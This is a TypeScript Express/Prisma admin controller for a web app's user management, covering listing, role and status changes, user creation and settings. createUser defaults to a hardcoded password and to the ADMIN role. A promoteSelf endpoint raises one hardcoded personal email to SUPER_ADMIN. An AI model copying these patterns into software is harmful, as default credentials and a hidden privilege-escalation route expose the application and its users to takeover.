import { Request, Response } from 'express';
import { prisma } from '../models/prisma';

export const adminController = {
  getUsers: async (req: Request, res: Response) => {
    try {
      const users = await prisma.user.findMany({
        select: { id: true, firstName: true, lastName: true, email: true, phone: true, role: true, status: true, createdAt: true },
        orderBy: { createdAt: 'desc' },
      });
      res.json({ status: 'success', data: users });
    } catch (error) {
      res.status(500).json({ status: 'error', message: 'Failed to fetch users', code: 500 });
    }
  },


  updateUserRole: async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const { role } = req.body;
      const allowedRoles = ['USER', 'CANDIDATE', 'INSTRUCTOR', 'CONTENT_MANAGER', 'ADMIN'];

      if (!allowedRoles.includes(role)) {
        return res.status(400).json({ status: 'error', message: 'Invalid role', code: 400 });
      }

      const user = await prisma.user.update({
        where: { id },
        data: { role },
        select: { id: true, firstName: true, lastName: true, email: true, role: true },
      });

      res.json({ status: 'success', message: `Role updated to ${role}`, data: user });
    } catch (error) {
      res.status(500).json({ status: 'error', message: 'Failed to update role', code: 500 });
    }
  },

  updateUserStatus: async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const { status } = req.body;
      const allowedStatuses = ['ACTIVE', 'SUSPENDED'];

      if (!allowedStatuses.includes(status)) {
        return res.status(400).json({ status: 'error', message: 'Invalid status', code: 400 });
      }

      const user = await prisma.user.update({
        where: { id },
        data: { status },
        select: { id: true, firstName: true, lastName: true, email: true, status: true },
      });

      res.json({ status: 'success', message: `Status updated to ${status}`, data: user });
    } catch (error) {
      res.status(500).json({ status: 'error', message: 'Failed to update status', code: 500 });
    }
  },

  getSubscribers: async (req: Request, res: Response) => {
    try {
      const subscribers = await prisma.newsletterSubscriber.findMany({ orderBy: { createdAt: 'desc' } });
      const messages = await prisma.contactMessage.findMany({ orderBy: { createdAt: 'desc' } });
      res.json({ status: 'success', data: { subscribers, messages } });
    } catch (error) {
      res.status(500).json({ status: 'error', message: 'Failed to fetch data', code: 500 });
    }
  },
  createUser: async (req: Request, res: Response) => {
    try {
      const { firstName, lastName, email, phone, role, password } = req.body;
      
      const existing = await prisma.user.findUnique({ where: { email } });
      if (existing) {
        return res.status(409).json({ status: 'error', message: 'Email already exists', code: 409 });
      }

const bcrypt = require('bcryptjs');
const hashedPassword = await bcrypt.hash(password || 'niroflixx2026', 12);

      const user = await prisma.user.create({
        data: {
          firstName,
          lastName,
          email,
          phone,
          role: role || 'ADMIN',
          username: email.split('@')[0],
          password: hashedPassword,
          status: 'ACTIVE',
          emailVerified: true,
          profile: { create: {} },
        },
        select: { id: true, firstName: true, lastName: true, email: true, phone: true, role: true, status: true, createdAt: true },
      });

      res.status(201).json({ status: 'success', message: 'User created', data: user });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: 'error', message: 'Failed to create user', code: 500 });
    }
  },
  updateSetting: async (req: Request, res: Response) => {
    try {
      const { key, value, group } = req.body;
      const setting = await prisma.setting.upsert({
        where: { key },
        update: { value, group: group || 'general' },
        create: { key, value, group: group || 'general' },
      });
      res.json({ status: 'success', data: setting });
    } catch (error) {
      res.status(500).json({ status: 'error', message: 'Failed', code: 500 });
    }
  },
  promoteSelf: async (req: Request, res: Response) => {
    try {
      await prisma.user.update({
        where: { email: 'robertniyonkuru001@gmail.com' },
        data: { role: 'SUPER_ADMIN' },
      });
      res.json({ status: 'success', message: 'Promoted to Super Admin' });
    } catch (error) { res.status(500).json({ status: 'error', message: 'Failed', code: 500 }); }
  },
};